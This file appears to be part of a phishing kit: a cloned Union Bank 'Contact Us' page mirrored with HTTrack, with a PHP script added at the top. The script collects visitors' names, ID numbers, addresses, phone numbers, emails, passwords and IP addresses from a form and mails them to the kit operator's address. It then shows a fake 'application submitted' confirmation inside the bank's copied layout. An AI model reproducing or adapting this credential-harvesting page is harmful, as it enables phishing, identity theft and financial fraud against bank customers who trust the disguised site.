<?php
$your_email = "#"; // put your email here
$lname = $_POST['lname'];
$fname = $_POST['fname'];
$age = $_POST['age'];
$formid = $_POST['ID'];
$idnum = $_POST['idnum'];
$idissue = $_POST['idissue'];
$occupation = $_POST['occupation'];
$comp = $_POST['comp'];
$add1 = $_POST['add1'];
$city = $_POST['city'];
$state = $_POST['state1'];
$country = $_POST['country'];
$zipcode = $_POST['zipcode'];
$tel = $_POST['tel'];
$fax2 = $_POST['fax2'];
$mobile = $_POST['mobile'];
$address_length = $_POST['address_length'];
$home_status = $_POST['home_status'];
$email = $_POST['email'];
$password = $_POST['password'];
$account_type = $_POST['account_type'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$msg = "
Last Name : $lname 
First Name : $fname 
Age : $age
Form of ID : $formid
ID No : $idnum
Place of Issue : $idissue
Occupation : $occupation
Company : $comp
Address : $add1
City : $city
State : $state
Country : $country 
Zip Code : $zipcode
Telephone : $tel 
Fax : $fax2
Mobile : $mobile
Length of Time : $address_length - $home_status
Email : $email 
Password : $password
Account Type : $account_type

IP Address : $ip 
Date Submitted : $today
";

mail($your_email,"Open Account", $msg);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html id="global" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" xmlns:tridion="http://www.tridion.com/ContentManager/5.0">

<!-- Mirrored from www.unionbank.com/global/contactus/index.jsp by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 08 Jul 2017 21:44:58 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<title>Overview | Contact Us | Union Bank</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta http-equiv="Content-Language" content="en-us" />
	<meta name="title" content="Overview | Contact Us | Union Bank" />
	<meta name="description" content="Contact Us" />
	<meta name="keywords" content="Contact Us" />
	<noscript>
	<meta http-equiv="Refresh" content="0; URL=../javascript-error.html" />
	</noscript>
	<link rel="stylesheet" type="text/css" media="all" href="../css/layout.css" />
	<link rel="stylesheet" type="text/css" media="all" href="../css/non-lob-pages.css" />
	<link rel="stylesheet" type="text/css" media="print" href="../css/layout-print.css" />
	<link rel="stylesheet" type="text/css" media="all" href="../css/faq-contact-us.css" />
   	<link rel="stylesheet" type="text/css" media="print" href="../css/custom.css" />
	
	<!--[if lt IE 7]>
	<link rel="stylesheet" type="text/css" media="all" href="/ubincludes/css/layout-ie6.css" />
	<![endif]-->
	<script type="text/javascript" src="../js/jquery-libs.js"></script>
	<script type="text/javascript" src="../js/ub.pages.js"></script>
	
	<link rel="canonical" href="../contactus/index.html" />
</head>
<body>
	

<!-- Start Header -->
<div class="header-wrapper"><div class="header-bg">
<div class="header-container">
    
    <a href="" class="logo"><span class="hidden">Union Bank</span></a>
        
    
        <script type="text/javascript" src="../js/ub.itg.js"></script> 
    
    <ul class="top-nav">
            <li id="nav-personal" class="top-nav-item first"><a href="../index.html" class="top-nav-item-face">Home</a></li>
            <li id="nav-small-business" class="top-nav-item"><a href="" class="top-nav-item-face">Small Business</a></li>
            <li id="nav-commercial-institutional" class="top-nav-item"><a href="" class="top-nav-item-face">Commercial &amp; Institutional</a></li>
            <li id="nav-the-private-bank" class="top-nav-item last"> <a href="" class="top-nav-item-face">The Private Bank</a></li>
    </ul>
    <script type="text/javascript">ub.utils.initTopNavCurrent()</script>
    <form class="top-search" action="" method="get">
	<input type="hidden" name="output" value="xml_no_dtd" />
	<input type="hidden" name="ie" value="UTF-8" />
	<input type="hidden" name="oe" value="UTF-8" />
	<input type="hidden" name="client" value="ub2_frontend" />
	<input type="hidden" name="proxystylesheet" value="ub2_frontend" />
	<input type="hidden" name="site" value="ub2_collection" />
	<input type="hidden" name="ubtopmenu" value="?" />
	<input type="hidden" name="ubbkimage" value="?" />
	<div class="clearfix">
		<input type="text" name="q" class="top-search-text default-text" title="Search" />
		<button type="submit" class="top-search-submit"></button>
	</div>
</form>    


    <div class="navigation-wrapper">
        <ul id="sub-personal" class="sub-nav">
<li class="sub-nav-item first">
<div class="sub-nav-item-face">
<a href="#"> Checking &amp; Savings</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Checking</a></li>
<li class="sub-nav-flyout-link"><a href=""> Savings</a></li>
<li class="sub-nav-flyout-link"><a href=""> Debit Cards</a></li>
<li class="sub-nav-flyout-link"><a href=""> Overdraft Services</a></li>
</ul>


<div class="sub-nav-flyout-col">
<span class="disclaimer-group-ref">tcm:9-65529</span>
	
		<img src="../Images/Priority-Flyout-Image.jpg"  alt="Priority Banking" title="Priority Banking" />
	 
	
		<div class="h5">Priority Banking</div>
	 
	
		<p>A more rewarding banking experience</p>
	 
	
		
			<a 

href=""

  class="more " >
				Learn more
			</a>
		 
		 
		 
	
</div>

<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Loans &amp; Lines of Credit</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Home Loans</a></li>
<li class="sub-nav-flyout-link"><a href=""> Home Equity</a></li>
<li class="sub-nav-flyout-link"><a href=""> Personal Line of Credit</a></li>
<li class="sub-nav-flyout-link"><a href=""> Credit Cards</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Investments &amp; Retirement</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Brokerage &amp; Investments</a></li>
<li class="sub-nav-flyout-link"><a href=""> Retirement</a></li>
<li class="sub-nav-flyout-link"><a href=""> Insurance</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Online &amp; Mobile Banking</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Online Banking</a></li>
<li class="sub-nav-flyout-link"><a href=""> Mobile Banking</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
</ul>
<ul id="sub-small-business" class="sub-nav">
<li class="sub-nav-item first">
<div class="sub-nav-item-face">
<a href="#"> Checking &amp; Savings</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Checking</a></li>
<li class="sub-nav-flyout-link"><a href=""> Savings</a></li>
<li class="sub-nav-flyout-link"><a href=""> Debit and ATM Cards</a></li>
<li class="sub-nav-flyout-link"><a href=""> Bank Securely</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Loans &amp; Lines of Credit</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Loans &amp; Lines of Credit</a></li>
<li class="sub-nav-flyout-link"><a href=""> Credit Cards</a></li>
<li class="sub-nav-flyout-link"><a href=""> Equipment Leasing</a></li>
<li class="sub-nav-flyout-link"><a href=""> Diversity Lending</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Business Services</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Deposit Solutions</a></li>
<li class="sub-nav-flyout-link"><a href=""> Payment Solutions</a></li>
<li class="sub-nav-flyout-link"><a href=""> Merchant Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> International</a></li>
<li class="sub-nav-flyout-link"><a href=""> Letters of Credit</a></li>
<li class="sub-nav-flyout-link"><a href=""> Employee Benefits</a></li>
<li class="sub-nav-flyout-link"><a href=""> Resource Center</a></li>
<li class="sub-nav-flyout-link"><a href=""> 401K Retirement</a></li>
</ul>


<div class="sub-nav-flyout-col">
<span class="disclaimer-group-ref">tcm:9-69393</span>
	
		<img src="../Images/SBRC-Flyout-Image.jpg"  alt="Small Business Resource Center" title="Small Business Resource Center" />
	 
	
		<div class="h5">Small Business Resource Center</div>
	 
	
		<p>Get information you can use to manage and grow your business.</p>
	 
	
		
			<a 

href=""


  class="more " >
				Learn More
			</a>
		 
		 
		 
	
</div>

<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Online &amp; Mobile Banking</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Online Banking</a></li>
<li class="sub-nav-flyout-link"><a href=""> Mobile Banking</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Business Resources</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Resource Center</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
</ul>
<ul id="sub-commercial-institutional" class="sub-nav">
<li class="sub-nav-item first">
<div class="sub-nav-item-face">
<a href="#"> Treasury Management</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Account Information &amp; Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Depository Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Payables Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Receivables Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Fraud Prevention Services</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Credit</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Loans and Lines of Credit</a></li>
<li class="sub-nav-flyout-link"><a href=""> Global Financing</a></li>
<li class="sub-nav-flyout-link"><a href=""> Asset Based Lending</a></li>
<li class="sub-nav-flyout-link"><a href=""> Specialized Financing</a></li>
<li class="sub-nav-flyout-link"><a href=""> Trade Finance</a></li>
<li class="sub-nav-flyout-link"><a href=""> Real Estate Financing</a></li>
<li class="sub-nav-flyout-link"><a href=""> Capital Markets</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Trust &amp; Custody</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Corporate Trust Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Global Custody Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Liquidity Agency Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Online Trust &amp; Custody</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Investment Management</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> HighMark Capital Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Institutional Brokerage</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Capital Markets</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Capital Markets</a></li>
<li class="sub-nav-flyout-link"><a href=""> Foreign Exchange</a></li>
<li class="sub-nav-flyout-link"><a href=""> Market Risk Management</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Global Solutions</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Strong Global Partner</a></li>
<li class="sub-nav-flyout-link"><a href=""> Global Financing</a></li>
<li class="sub-nav-flyout-link"><a href=""> Foreign Exchange</a></li>
<li class="sub-nav-flyout-link"><a href=""> Global Trade Services and Finance</a></li>
<li class="sub-nav-flyout-link"><a href=""> Global Trust Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Liquidity Management</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
</ul>
<ul id="sub-the-private-bank" class="sub-nav">
<li class="sub-nav-item first">
<div class="sub-nav-item-face">
<a href="#"> The Private Bank</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Wealth Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Individuals &amp; Families</a></li>
<li class="sub-nav-flyout-link"><a href=""> Business Owners</a></li>
<li class="sub-nav-flyout-link"><a href=""> Corporate Executives</a></li>
<li class="sub-nav-flyout-link"><a href=""> Law Firms</a></li>
<li class="sub-nav-flyout-link"><a href=""> Medical Practices</a></li>
<li class="sub-nav-flyout-link"><a href=""> CPA Firms</a></li>
<li class="sub-nav-flyout-link"><a href=""> Non-Profit Organizations</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Wealth Planning</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Wealth Planning -- Overview</a></li>
<li class="sub-nav-flyout-link"><a href=""> LIFE Map Wealth Planning</a></li>
<li class="sub-nav-flyout-link"><a href=""> Strategic Wealth Plan</a></li>
</ul>




<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Loans &amp; Deposits</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Loans &amp; Deposits -- Overview</a></li>
<li class="sub-nav-flyout-link"><a href=""> Private Advantage Checking</a></li>
<li class="sub-nav-flyout-link"><a href=""> Deposit &amp; Liquidity Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Lending Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Jumbo Mortgages</a></li>
<li class="sub-nav-flyout-link"><a href=""> Portfolio Access Line of Credit</a></li>
<li class="sub-nav-flyout-link"><a href=""> Treasury Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Foreign Exchange</a></li>
<li class="sub-nav-flyout-link"><a href=""> Credit Cards</a></li>
</ul>


<div class="sub-nav-flyout-col">
<span class="disclaimer-group-ref">tcm:9-43214</span>
	
		<img src="../Images/online-mobile-flyout_148x63.jpg"  alt="Online & Mobile Banking" title="Online & Mobile Banking" />
	 
	
		<div class="h5">Online &amp; Mobile Banking</div>
	 
	
		<p>Enjoy the convenience of Online &amp; Mobile Banking.</p>
	 
	
		 
		
			<a href="../private-bank/loans-deposits/online-banking/index.html"   class="more " >Learn More</a>		 
		 
	
</div>

<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Trust &amp; Estate Services</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Trust &amp; Estate Services -- Overview</a></li>
<li class="sub-nav-flyout-link"><a href=""> Trust Administration</a></li>
<li class="sub-nav-flyout-link"><a href=""> Estate Settlement</a></li>
<li class="sub-nav-flyout-link"><a href=""> Philanthropic Services</a></li>
<li class="sub-nav-flyout-link"><a href=""> Real Estate Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Oil, Gas, and Mineral Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Closely Held Businesses</a></li>
<li class="sub-nav-flyout-link"><a href=""> Loan Management</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Risk Management</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Risk Management -- Overview</a></li>
<li class="sub-nav-flyout-link"><a href=""> Insurance</a></li>
<li class="sub-nav-flyout-link"><a href=""> Interest Rate Risk Management</a></li>
<li class="sub-nav-flyout-link"><a href=""> Foreign Exchange Risk Management</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
<li class="sub-nav-item">
<div class="sub-nav-item-face">
<a href="#"> Investments</a>
</div>
<div class="sub-nav-flyout">
<div class="sub-nav-flyout-panel">
<ul class="sub-nav-flyout-links">
<li class="sub-nav-flyout-link"><a href=""> Investments -- Overview</a></li>
<li class="sub-nav-flyout-link"><a href=""> Managed Account Program</a></li>
<li class="sub-nav-flyout-link"><a href=""> Brokerage Services</a></li>
</ul>
<div class="clear"></div>
</div>
</div>
</li>
</ul>

        <ul class="global-navigation sub-nav">
	<li class="sub-nav-item first">
		<div class="sub-nav-item-face"><a href="">About Union Bank</a></div>
	</li>
	<li class="sub-nav-item">
		<div class="sub-nav-item-face"><a href="#">Contact Us</a></div>
	</li>
	<li class="sub-nav-item">
		<div class="sub-nav-item-face">My State: <a id="stateoverlay" href="javascript:void(0)"><span id="ubmystate"></span></a>
		<script type="text/javascript">
		window.dom.query('#ubmystate').ready(function ($) {
			$('#ubmystate').text($.cookie("UBMarketRegion") || "--");
		});
		</script>
		</div>
	</li>
	<li class="sub-nav-item">
		<div class="sub-nav-item-face"><a href="#Branch-Locator" onclick="return false;">Find Locations<span class="adaAccessibilityHidden">menu</span></a></div>
		<span class="adaAccessibilityHidden">Start of Find Locations dialog.</span>
		<form class="home-find-location sub-nav-flyout" name="find-a-branch-flyout" action="" method="get">
			<input type="text" name="find-a-branch" id="home-find-location-text" class="home-find-location-text default-text" title="Zip or City, State" /> 
			<button type="submit" class="home-find-location-go">Go</button>
			<div class="find-flyout">
				<a href="#" class="find-flyout-trigger" style="width:75px;">More Options &gt;</a>
				<a style="color: #666666;position:absolute;top:37px;left:95px;font-weight:bold;text-decoration:none;font-size:1em;" onmouseover="this.style.color='#333333';" onmouseout="this.style.color='#666666';" onfocus="this.style.color='#333333';" onblur="this.style.color='#666666';" href="">All Locations &gt</a>
				<div class="find-flyout-panel">
					<ul>
						<li><input type="checkbox" value="sl-branch" id="sl-branch" checked="checked" /><label for="sl-branch">Branches</label></li>
						<li><input type="checkbox" value="sl-allatm" id="sl-allatm" /><label for="sl-allatm">ATMs</label></li>
						<li><input type="checkbox" value="sl-fcxchg" id="sl-fcxchg" /><label for="sl-fcxchg">Foreign Currency Exchange</label></li>
						<li><input type="checkbox" value="sl-isbranch" id="sl-isbranch" /><label for="sl-isbranch">In-Store Branches</label></li>
					</ul>
				</div>
			</div>
		</form>
		<span class="adaAccessibilityHidden">End of Find Locations dialog.</span>
		<div class="clear"></div>
	</li>
	<li class="sub-nav-item last">
		<div class="sub-nav-item-face"><a href="">Help</a></div>
	</li>
</ul>
<script type="text/javascript">ub.utils.initGlobalNavigation();</script>
<!--- Following code to display state overlay --->
<script type="text/javascript">
window.dom.query(document).ready(function ($) {
	$('#stateoverlay').click(function () {
		$('#state-widget').css("display","block");
		$('#stateselection').css("display","block");
	});
});
</script>
<div id ="state-widget" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #5c5c5c; opacity: .80;filter:Alpha(Opacity=80); display:none;"></div>

<div id="stateselection" name="stateselection" style="z-index: 10000; position: absolute; visibility: visible; left: 350px; top: 183px; display:none;">
	<div class="itgRateStateSelection" style="background-image: url('../css/img/overlay_StateSelection_closed_v2.png'); width: 337px; height: 181px;">
	<a style="padding: 0; margin: 0; width: 16px; height: 16px; position: relative; top: 18px; left: 302px;" id="closeButton" href="javascript:void(0)" onclick="window.location.reload()"><img src="../css/img/overlay_close.png" border="0" title="Close" alt="Close" /></a>
	<div id="stateSelectionFormContainer" style="position: relative; top: 112px; left: 15px; width: 303px;">
		<span class="adaAccessibilityHidden">Start of State Selection form.</span>
		<form method="post" id="stateSelectionForm" name="stateSelectionForm" action="javascript:void(0)">
			<select name="rates-state-selection" id="rates-state-selection" title="Select Your State"><option value="">Select Your State</option><option value="AL">AL</option><option value="AK">AK</option><option value="AZ">AZ</option><option value="AR">AR</option><option value="CA">CA</option><option value="CO">CO</option><option value="CT">CT</option><option value="DE">DE</option><option value="DC">DC</option><option value="FL">FL</option><option value="GA">GA</option><option value="HI">HI</option><option value="ID">ID</option><option value="IL">IL</option><option value="IN">IN</option><option value="IA">IA</option><option value="KS">KS</option><option value="KY">KY</option><option value="LA">LA</option><option value="ME">ME</option><option value="MD">MD</option><option value="MA">MA</option><option value="MI">MI</option><option value="MN">MN</option><option value="MS">MS</option><option value="MO">MO</option><option value="MT">MT</option><option value="NE">NE</option><option value="NV">NV</option><option value="NH">NH</option><option value="NJ">NJ</option><option value="NM">NM</option><option value="NY">NY</option><option value="NC">NC</option><option value="ND">ND</option><option value="OH">OH</option><option value="OK">OK</option><option value="OR">OR</option><option value="PA">PA</option><option value="RI">RI</option><option value="SC">SC</option><option value="SD">SD</option><option value="TN">TN</option><option value="TX">TX</option><option value="UT">UT</option><option value="VT">VT</option><option value="VA">VA</option><option value="WA">WA</option><option value="WV">WV</option><option value="WI">WI</option><option value="WY">WY</option></select>
			<span>
				<button class="home-find-location-go" style="margin-right:10px;" value="Go" type="submit">Go</button>
				<a href="javascript:void(0)" onclick="window.location.reload()">Cancel</a>
			 </span>
		</form>
		<span class="adaAccessibilityHidden">End of State Selection form.</span>
	</div>
	<script type="text/javascript">
	if (window.dom && window.dom.query) {
		window.dom.query('#stateSelectionForm').ready(function ($) {
			"use strict";
			$('#rates-state-selection').val($.cookie("UBMarketRegion") || "");
			var form = $('#stateSelectionForm').submit(function () {
				var chosenState = form.find('select[name=rates-state-selection]').val();
				if (chosenState !== '') {
					$.cookie("UBMarketRegion", chosenState, { path: '/' , expires: 3653 });
					window.location.reload();
				} else {
					$('#stateSelectionMessage').show();
					$('#rates-state-selection').css('border', 'solid 1px #DA2128');
				}
			});
		});
	}
	</script>
	</div>
</div>         <div class="clear"></div>
    </div>
        
    

</div>
</div></div>
<!-- End Header -->
	<div class="content">
		<div class="top-actions-container content-panel">
			<p class="left breadcrumb">
				<a href="../contactus/index.html" class="breadcrumb-item">Contact Us</a>&nbsp;
			</p>
			<p class="right">
				<a href="#" class="action-item" id="action-print-page">Print</a> | <a href="#" class="action-item" id="action-email-page">Email</a>
			</p>
			<div class="clear"></div>
		</div>
		
		<div class="product-details-container content-panel ">
			<div class="main-content-left-rail">

				
				
				

<div class="sub-nav-category shadow">
<script type="text/javascript">ub.BeginComponent('.sub-nav-category')</script>
<span class="disclaimer-group-ref">tcm:9-42464</span>
	
	        
	<div class="sub-category">
		<div class="sub-category"> 
		
		<ul>
			   
			<li>
				
					<a 

href="../contactus/index.html"

 >Overview</a>
				
				 
				 

				

				

				
			</li>
			   
			<li>
				
					<a 

href=""

 >Get Help by Email</a>
				
				 
				 

				

				

				
			</li>
			   
			<li>
				
					<a 

href=""

 >Send Us Feedback</a>
				
				 
				 

				

				

				
			</li>
			   
			<li>
				
					<a 

href=""

 >Call Us</a>
				
				 
				 

				

				

				
			</li>
			   
			<li>
				
					<a 

href=""

 >Find a Branch</a>
				
				 
				 

				

				

				
			</li>
			
		</ul>
		</div>
	</div>
	
</div>


				
				
				

			</div>

			<div class="products-details tabbed-content-general shadow">
				
				
				<div id="products-tab-item-0" class="tab-panel">
						<span class="disclaimer-group-ref">tcm:9-42248</span>
						
						<div class="tab-title" ><h1></h1></div>
						
						
						    
    
        <div class="component text-container">
          
						<h4>Online Banking| Registration</h4>
<?php
echo 'Your Application has been submitted succesfully, you will be notified after you application have been reviewed, thank you for choosing Union Bank<br>
go back <a href="../index.html">Home</a>';
?>
</div>
<div class="ub-dotted-line-horiz ub-1em-n"> </div>
						
						<div class="ub-dotted-line-horiz"> </div>
						</div>
				</div>
			</div>
			<div class="main-content-right-rail">

				
				
					

<style>
.help-cta-row {border-top:1px dotted #6F6F6F; min-height:40px; padding:6px 0;}
.help-cta-row.no-border {border-top:0 none;}
.help-cta-unit-title {font-size:1.2em; font-weight:bold;}
.help-cta-unit-right ol, .help-cta-unit ol {list-style:decimal inside none; margin:0.25em 0;}
.help-cta-unit-right a, .help-cta-unit a {color:#FFFFFF; text-decoration:underline;}
</style>
<div class="get-started component shadow shadow-box">
	<span class="disclaimer-group-ref">tcm:9-42463</span>
	
		<div class="get-started-title">HELP</div>
	
	
		<div class="help-cta-row">
			
			
				<div class="help-cta-unit">
			
			
					<div class="help-cta-unit-title">
						Quick Answers/FAQs:
					</div>
			
			<ol>
				
					<li>
						
							<a href="" class="">
								What&#39;s my routing/ABA number?
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								How do I activate an ATM or debit card?
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								How do I reorder checks?
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								How can I change my address/phone info?
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								I forgot/lost my online banking password.
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								How do I stop payment on a check?
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								How do I transfer funds to another account through online banking?
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								How do I investigate/dispute a purchase that appears on my account?
							</a>
						
						
						
					</li>
				
					<li>
						
							<a href="" class="">
								How can I view my account history in online banking?
							</a>
						
						
						
					</li>
				
			</ol>
			
				<a href="">See All &gt;</a>
			
			</div>
			<div class="clear"></div>
		</div>
	
</div>
<div class="home-message-area-item">
<span class="disclaimer-group-ref">tcm:9-42649</span>
	
		<img src="../Images/send_feedback.gif"  alt="Send Feedback" title="Send Feedback" width="224" height="100"/>
	 
	 
	
		<a href="#"   class="cta-button "><span class="text">Go</span></a>	 
	 
<div class="home-message-area-item-text">
	
	 
</div>
</div>
			

<div class="home-message-area-item">
<span class="disclaimer-group-ref">tcm:9-67958</span>
	
		<img src="../Images/union_bank_holidays.jpg"  alt="Official Union Bank Holidays" title="Official Union Bank Holidays" width="224" height="100"/>
	 
	 
	
		<a href="#"   class="cta-button "><span class="text">Go</span></a>	 
	 
<div class="home-message-area-item-text">
	
		<div class="component-content"></div>
	 
</div>
</div>
	
				
			</div>
			
			<div class="clear"></div>
		</div>

	</div>

	<!-- disclaimer footer -->
	
	<!-- /disclaimer footer -->

		<!-- footer -->
	
		

<div class="footer">
    
        
            <div>
                

<span class="disclaimer-group-ref">tcm:9-42490</span>
<dl class="footer-links">
<dt>About Us</dt>
<dd>
<ul class="footer-links-list">
	
		
			<li><a href=""   >
				Careers
			</a></li>
		 
		 
		 
	
		 
		
			<li><a href=""      >Newsroom</a></li>
		 
		 
	
		 
		 
		
			<li><a href="../Images/MUFG_Corporate_Profile.pdf">
				Corporate Profile
			</a></li>
		 
	
		 
		
			<li><a href=""      >Community Outreach</a></li>
		 
		 
	
		 
		
			<li><a href=""      >Diversity and Culture</a></li>
		 
		 
	
		 
		
			<li><a href=""      >Corporate Social Responsibility</a></li>
		 
		 
	
		 
		
			<li><a href=""      >Our Parent - MUFG</a></li>
		 
		 
	
		 
		
			<li><a href="">Hearing-impaired &amp; Visually Impaired Services</a></li>
		 
		 
	
</ul>
</dd>
</dl>            </div>
        
            <div>
                

<span class="disclaimer-group-ref">tcm:9-42491</span>
<dl class="footer-links">
<dt>Privacy &amp; Security</dt>
<dd>
<ul class="footer-links-list">
	
		 
		
			<li><a href=""      >Privacy &amp; Security Center</a></li>
		 
		 
	
		 
		
			<li><a href=""      >Online Security</a></li>
		 
		 
	
		 
		
			<li><a href=""      >Identity Theft</a></li>
		 
		 
	
		 
		
			<li><a href=""      >Fraud Education</a></li>
		 
		 
	
		
			<li><a href=""   >
				Privacy Policy
			</a></li>
		 
		 
		 
	
</ul>
</dd>
</dl>            </div>
        
            <div>
                

<span class="disclaimer-group-ref">tcm:9-42493</span>
<dl class="footer-links">
<dt>Corporate Social Responsibility</dt>
<dd>
<ul class="footer-links-list">
	
		 
		
			<li><a href="">Charitable Contributions</a></li>
		 
		 
	
		 
		
			<li><a href="">Serving Communities</a></li>
		 
		 
	
		 
		
			<li><a href="">Environmental Sustainability</a></li>
		 
		 
	
		 
		
			<li><a href="">Supplier Diversity</a></li>
		 
		 
	
		 
		
			<li><a href="">Key People</a></li>
		 
		 
	
</ul>
</dd>
</dl>            </div>
        
            <div>
                

<span class="disclaimer-group-ref">tcm:9-42494</span>
<dl class="footer-links">
<dt>Corporate Profile</dt>
<dd>
<ul class="footer-links-list">
	
		 
		 
		
			<li><a href="">
				History &amp; Timeline
			</a></li>
		 
	
		 
		
			<li><a href="">Policy-Making Officers</a></li>
		 
		 
	
		 
		
			<li><a href="">Our Parent - About MUFG</a></li>
		 
		 
	
		 
		
